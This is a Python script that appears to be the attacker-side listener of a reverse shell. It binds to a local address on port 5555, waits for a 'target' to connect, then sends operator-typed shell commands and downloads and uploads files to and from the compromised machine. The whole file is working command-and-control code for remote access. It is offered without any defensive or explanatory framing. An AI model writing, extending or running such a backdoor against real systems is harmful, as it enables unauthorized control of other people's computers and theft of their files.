import socket
import json
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def server_send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode())

def server_recv():
	data = ""
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def download_file(file_name):
	file = open(file_name, "wb")
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		file.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	file.close()

def upload_file(file_name):
	file = open(file_name, "rb")
	target.send(file.read())

def target_communication():
	while True:
		command = input("* shell~%s: " % str(address))
		server_send(command)

		if command == "quit":
			break
		elif command[:3] == "cd ":
			pass
		elif command == "clear":
			os.system("clear")

		elif command[:8] == "download":
			download_file(command[9:])
		
		elif command[:6] == "upload":
			upload_file(command[7:])
		else:
			result = server_recv()
			print(result)

host = "192.168.1.103"
port = 5555

sock.bind((host, port))

sock.listen(5)
print("[+] listening to the incoming connection...")

target, address = sock.accept()
print(f"target connected from: {str(address)}")
target_communication()
